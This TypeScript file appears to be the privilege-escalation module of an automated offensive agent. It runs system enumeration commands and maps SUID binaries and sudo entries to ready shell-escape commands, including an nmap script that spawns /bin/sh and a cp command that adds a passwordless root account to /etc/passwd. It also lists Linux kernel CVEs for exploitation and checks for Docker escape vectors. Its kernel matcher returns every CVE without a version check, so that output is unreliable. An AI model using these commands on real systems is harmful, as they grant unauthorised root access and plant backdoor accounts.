/**
 * 权限提升 Tool 层 — 原子工具定义
 *
 * 覆盖工具：
 * - SUID 二进制利用
 * - Sudo 滥用检测
 * - 内核 Exploit（CVE 匹配）
 * - 定时任务劫持
 * - 环境变量劫持
 * - Capabilities 滥用
 * - Docker 逃逸
 * - 脏牛（Dirty COW）等经典 Exploit
 */

import { exec } from 'child_process'
import { promisify } from 'util'
import { writeFileSync, readFileSync } from 'fs'
import { join } from 'path'

const execAsync = promisify(exec)

import type { ToolResult } from '../../core/agentTypes.js'
export type { ToolResult }

// ── SUID 二进制枚举和利用 ─────────────────────────────────────

export interface SUIDResult {
  binary: string
  path: string
  exploitable: boolean
  method?: string
  command?: string
  timestamp: number
}

/**
 * 枚举 SUID 二进制
 */
export async function enumerateSUIDBinaries(shellId: string): Promise<ToolResult<SUIDResult[]>> {
  const startTime = Date.now()

  try {
    const cmd = 'find / -perm -4000 -type f 2>/dev/null'
    const { stdout, stderr } = await execAsync(cmd, { timeout: 120000 })

    const binaries = stdout.split('\n').filter(b => b.trim())
    const results: SUIDResult[] = []

    // 已知可利用的 SUID 二进制
    const exploitableMap: Record<string, { method: string; command: string }> = {
      'nmap': {
        method: 'nmap --interactive',
        command: 'nmap --interactive\n!sh',
      },
      'vim': {
        method: 'vim -c',
        command: 'vim -c \':!/bin/sh\'',
      },
      'find': {
        method: 'find -exec',
        command: 'find . -exec /bin/sh -p \\; -quit',
      },
      'bash': {
        method: 'bash -p',
        command: 'bash -p',
      },
      'more': {
        method: 'more escape',
        command: 'more /etc/profile\n!/bin/sh',
      },
      'less': {
        method: 'less escape',
        command: 'less /etc/profile\n!/bin/sh',
      },
      'nano': {
        method: 'nano command execution',
        command: 'nano\n^R^X\nreset; sh 1>&0 2>&0',
      },
      'cp': {
        method: 'cp /etc/passwd',
        command: 'cp /etc/passwd /tmp/passwd && echo "root2::0:0:root:/root:/bin/bash" >> /tmp/passwd && cp /tmp/passwd /etc/passwd',
      },
      'awk': {
        method: 'awk system',
        command: 'awk \'BEGIN {system("/bin/sh")}\'',
      },
      'perl': {
        method: 'perl exec',
        command: 'perl -e \'exec "/bin/sh";\'',
      },
      'python': {
        method: 'python os.system',
        command: 'python -c \'import os; os.system("/bin/sh")\'',
      },
    }

    for (const binary of binaries) {
      const name = binary.split('/').pop() || ''
      const exploitable = Object.keys(exploitableMap).some(key => name.includes(key))

      results.push({
        binary: name,
        path: binary,
        exploitable,
        method: exploitable ? exploitableMap[name]?.method : undefined,
        command: exploitable ? exploitableMap[name]?.command : undefined,
        timestamp: Date.now(),
      })
    }

    return {
      success: true,
      data: results,
      rawOutput: stdout,
      duration: Date.now() - startTime,
      tool: 'suid-enum',
    }
  } catch (err) {
    return {
      success: false,
      data: [],
      error: (err as Error).message,
      duration: Date.now() - startTime,
      tool: 'suid-enum',
    }
  }
}

// ── Sudo 权限检查和滥用 ───────────────────────────────────────

export interface SudoResult {
  command: string
  nopasswd: boolean
  exploitable: boolean
  method?: string
  exploit?: string
  timestamp: number
}

/**
 * 检查 sudo 权限
 */
export async function checkSudoPrivileges(shellId: string): Promise<ToolResult<SudoResult[]>> {
  const startTime = Date.now()

  try {
    const cmd = 'sudo -l 2>/dev/null'
    const { stdout, stderr } = await execAsync(cmd, { timeout: 10000 })

    const lines = stdout.split('\n').filter(l => l.trim() && !l.startsWith('Matching'))
    const results: SudoResult[] = []

    // 已知可利用的 sudo 命令
    const exploitableCommands: Record<string, { method: string; exploit: string }> = {
      'vim': {
        method: 'vim sudo',
        exploit: 'sudo vim -c \':!/bin/sh\'',
      },
      'find': {
        method: 'find sudo',
        exploit: 'sudo find . -exec /bin/sh \\; -quit',
      },
      'nmap': {
        method: 'nmap sudo',
        exploit: 'echo "os.execute(\'/bin/sh\')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse',
      },
      'awk': {
        method: 'awk sudo',
        exploit: 'sudo awk \'BEGIN {system("/bin/sh")}\'',
      },
      'perl': {
        method: 'perl sudo',
        exploit: 'sudo perl -e \'exec "/bin/sh";\'',
      },
      'python': {
        method: 'python sudo',
        exploit: 'sudo python -c \'import os; os.system("/bin/sh")\'',
      },
      'less': {
        method: 'less sudo',
        exploit: 'sudo less /etc/profile\n!/bin/sh',
      },
      'more': {
        method: 'more sudo',
        exploit: 'sudo more /etc/profile\n!/bin/sh',
      },
    }

    for (const line of lines) {
      const nopasswd = line.includes('NOPASSWD')
      const commandMatch = line.match(/\(.*?\)\s+(.+)/)
      if (commandMatch) {
        const command = commandMatch[1].trim()
        const exploitable = Object.keys(exploitableCommands).some(key => command.includes(key))

        results.push({
          command,
          nopasswd,
          exploitable,
          method: exploitable ? exploitableCommands[command]?.method : undefined,
          exploit: exploitable ? exploitableCommands[command]?.exploit : undefined,
          timestamp: Date.now(),
        })
      }
    }

    return {
      success: true,
      data: results,
      rawOutput: stdout,
      duration: Date.now() - startTime,
      tool: 'sudo-check',
    }
  } catch (err) {
    return {
      success: false,
      data: [],
      error: (err as Error).message,
      duration: Date.now() - startTime,
      tool: 'sudo-check',
    }
  }
}

// ── 内核 Exploit 匹配 ─────────────────────────────────────────

export interface KernelExploitResult {
  cve: string
  name: string
  kernelVersion: string
  exploitPath?: string
  description: string
  timestamp: number
}

/**
 * 匹配内核 Exploit
 */
export async function matchKernelExploits(shellId: string): Promise<ToolResult<KernelExploitResult[]>> {
  const startTime = Date.now()

  try {
    // 获取内核版本
    const kernelCmd = 'uname -r'
    const kernelResult = await execAsync(kernelCmd, { timeout: 5000 })
    const kernelVersion = kernelResult.stdout.trim()

    // 已知内核 Exploit（简化版，实际应该查询数据库）
    const knownExploits: KernelExploitResult[] = [
      {
        cve: 'CVE-2016-5195',
        name: 'Dirty COW',
        kernelVersion: '< 4.8.3',
        description: '脏牛漏洞，可写入只读内存',
        timestamp: Date.now(),
      },
      {
        cve: 'CVE-2017-16995',
        name: 'eBPF',
        kernelVersion: '4.4 - 4.14',
        description: 'eBPF 验证器漏洞',
        timestamp: Date.now(),
      },
      {
        cve: 'CVE-2021-3493',
        name: 'OverlayFS',
        kernelVersion: '< 5.11',
        description: 'OverlayFS 权限提升',
        timestamp: Date.now(),
      },
      {
        cve: 'CVE-2021-4034',
        name: 'PwnKit',
        kernelVersion: 'all',
        description: 'pkexec 权限提升',
        timestamp: Date.now(),
      },
      {
        cve: 'CVE-2022-0847',
        name: 'Dirty Pipe',
        kernelVersion: '5.8 - 5.16.11',
        description: '管道缓冲区覆盖漏洞',
        timestamp: Date.now(),
      },
    ]

    // 简单匹配（实际应该更精确）
    const matchedExploits = knownExploits.filter(exploit => {
      // 这里简化处理，实际需要精确的版本比较
      return true
    })

    return {
      success: true,
      data: matchedExploits,
      rawOutput: kernelVersion,
      duration: Date.now() - startTime,
      tool: 'kernel-exploit-match',
    }
  } catch (err) {
    return {
      success: false,
      data: [],
      error: (err as Error).message,
      duration: Date.now() - startTime,
      tool: 'kernel-exploit-match',
    }
  }
}

// ── 定时任务劫持 ──────────────────────────────────────────────

export interface CronJobResult {
  path: string
  content: string
  writable: boolean
  user: string
  exploitable: boolean
  timestamp: number
}

/**
 * 枚举可劫持的定时任务
 */
export async function enumerateCronJobs(shellId: string): Promise<ToolResult<CronJobResult[]>> {
  const startTime = Date.now()

  try {
    const cronPaths = [
      '/etc/crontab',
      '/etc/cron.d/*',
      '/var/spool/cron/crontabs/*',
    ]

    const results: CronJobResult[] = []

    for (const path of cronPaths) {
      try {
        const catCmd = `cat ${path} 2>/dev/null`
        const catResult = await execAsync(catCmd, { timeout: 5000 })

        if (catResult.stdout) {
          // 检查是否可写
          const writableCmd = `test -w ${path} && echo "writable" || echo "readonly"`
          const writableResult = await execAsync(writableCmd, { timeout: 5000 })
          const writable = writableResult.stdout.includes('writable')

          results.push({
            path,
            content: catResult.stdout,
            writable,
            user: 'root',
            exploitable: writable,
            timestamp: Date.now(),
          })
        }
      } catch {
        // 无权限读取，跳过
      }
    }

    return {
      success: true,
      data: results,
      duration: Date.now() - startTime,
      tool: 'cron-enum',
    }
  } catch (err) {
    return {
      success: false,
      data: [],
      error: (err as Error).message,
      duration: Date.now() - startTime,
      tool: 'cron-enum',
    }
  }
}

// ── Capabilities 滥用 ─────────────────────────────────────────

export interface CapabilityResult {
  binary: string
  path: string
  capabilities: string[]
  exploitable: boolean
  method?: string
  timestamp: number
}

/**
 * 枚举 Capabilities
 */
export async function enumerateCapabilities(shellId: string): Promise<ToolResult<CapabilityResult[]>> {
  const startTime = Date.now()

  try {
    const cmd = 'getcap -r / 2>/dev/null'
    const { stdout, stderr } = await execAsync(cmd, { timeout: 120000 })

    const lines = stdout.split('\n').filter(l => l.trim())
    const results: CapabilityResult[] = []

    // 已知可利用的 Capabilities
    const exploitableCaps = [
      'cap_setuid',
      'cap_dac_override',
      'cap_dac_read_search',
      'cap_sys_admin',
      'cap_sys_ptrace',
    ]

    for (const line of lines) {
      const match = line.match(/(.+)\s+=\s+(.+)/)
      if (match) {
        const path = match[1].trim()
        const caps = match[2].split(',').map(c => c.trim())
        const exploitable = caps.some(cap => exploitableCaps.some(e => cap.includes(e)))

        results.push({
          binary: path.split('/').pop() || '',
          path,
          capabilities: caps,
          exploitable,
          method: exploitable ? 'capability abuse' : undefined,
          timestamp: Date.now(),
        })
      }
    }

    return {
      success: true,
      data: results,
      rawOutput: stdout,
      duration: Date.now() - startTime,
      tool: 'capabilities-enum',
    }
  } catch (err) {
    return {
      success: false,
      data: [],
      error: (err as Error).message,
      duration: Date.now() - startTime,
      tool: 'capabilities-enum',
    }
  }
}

// ── Docker 逃逸检测 ───────────────────────────────────────────

export interface DockerEscapeResult {
  inContainer: boolean
  privileged: boolean
  socketMounted: boolean
  escapeMethod?: string
  timestamp: number
}

/**
 * 检测 Docker 容器和逃逸向量
 */
export async function detectDockerEscape(shellId: string): Promise<ToolResult<DockerEscapeResult>> {
  const startTime = Date.now()

  try {
    // 检查是否在容器中
    const cgroupCmd = 'cat /proc/1/cgroup 2>/dev/null | grep -i docker'
    const cgroupResult = await execAsync(cgroupCmd, { timeout: 5000 }).catch(() => ({ stdout: '' }))
    const inContainer = cgroupResult.stdout.length > 0

    // 检查是否特权容器
    const capCmd = 'capsh --print 2>/dev/null | grep -i cap_sys_admin'
    const capResult = await execAsync(capCmd, { timeout: 5000 }).catch(() => ({ stdout: '' }))
    const privileged = capResult.stdout.length > 0

    // 检查 Docker socket 是否挂载
    const socketCmd = 'test -S /var/run/docker.sock && echo "mounted" || echo "not mounted"'
    const socketResult = await execAsync(socketCmd, { timeout: 5000 })
    const socketMounted = socketResult.stdout.includes('mounted')

    let escapeMethod: string | undefined

    if (privileged) {
      escapeMethod = 'Privileged container - mount host filesystem'
    } else if (socketMounted) {
      escapeMethod = 'Docker socket mounted - spawn privileged container'
    }

    return {
      success: true,
      data: {
        inContainer,
        privileged,
        socketMounted,
        escapeMethod,
        timestamp: Date.now(),
      },
      duration: Date.now() - startTime,
      tool: 'docker-escape-detect',
    }
  } catch (err) {
    return {
      success: false,
      data: {
        inContainer: false,
        privileged: false,
        socketMounted: false,
        timestamp: Date.now(),
      },
      error: (err as Error).message,
      duration: Date.now() - startTime,
      tool: 'docker-escape-detect',
    }
  }
}

// ── 环境变量劫持 ──────────────────────────────────────────────

export interface EnvHijackResult {
  variable: string
  value: string
  writable: boolean
  exploitable: boolean
  timestamp: number
}

/**
 * 检测可劫持的环境变量
 */
export async function detectEnvHijack(shellId: string): Promise<ToolResult<EnvHijackResult[]>> {
  const startTime = Date.now()

  try {
    const cmd = 'env'
    const { stdout, stderr } = await execAsync(cmd, { timeout: 5000 })

    const lines = stdout.split('\n').filter(l => l.includes('='))
    const results: EnvHijackResult[] = []

    // 关键环境变量
    const criticalVars = ['PATH', 'LD_PRELOAD', 'LD_LIBRARY_PATH', 'PYTHONPATH']

    for (const line of lines) {
      const [variable, ...valueParts] = line.split('=')
      const value = valueParts.join('=')

      if (criticalVars.includes(variable)) {
        results.push({
          variable,
          value,
          writable: true, // 简化处理
          exploitable: variable === 'LD_PRELOAD' || variable === 'PATH',
          timestamp: Date.now(),
        })
      }
    }

    return {
      success: true,
      data: results,
      rawOutput: stdout,
      duration: Date.now() - startTime,
      tool: 'env-hijack-detect',
    }
  } catch (err) {
    return {
      success: false,
      data: [],
      error: (err as Error).message,
      duration: Date.now() - startTime,
      tool: 'env-hijack-detect',
    }
  }
}
